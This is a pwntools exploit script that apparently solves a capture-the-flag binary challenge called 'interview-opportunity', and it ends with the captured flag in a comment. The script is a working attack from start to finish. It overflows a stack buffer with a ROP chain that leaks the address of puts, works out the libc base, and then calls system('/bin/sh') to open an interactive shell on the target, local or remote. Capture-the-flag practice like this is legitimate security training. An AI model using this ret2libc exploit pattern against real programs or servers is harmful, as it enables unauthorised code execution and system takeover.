from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './interview-opportunity'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# Start program
io = start()

offset = 34  # IP offset
pop_rdi = 0x401313

payload = flat({
  offset: [
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.symbols.main
  ]
})

# Send the payload
print(io.recv())
print(payload)
io.send(payload)

repeated_main = io.recvuntil(b':')
io.recvline()
io.recvline()
address = io.recvline().strip()

got_puts = unpack(address.ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

libc_base = got_puts - libc.symbols['puts']
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
system_addr = libc_base + libc.symbols['system']
info("system_addr: %#x", system_addr)
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
info("bin_sh: %#x", bin_sh)

payload = flat({
  offset: [
    pop_rdi,
    bin_sh,
    system_addr
  ]
})

io.send(payload)

io.interactive()

# dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
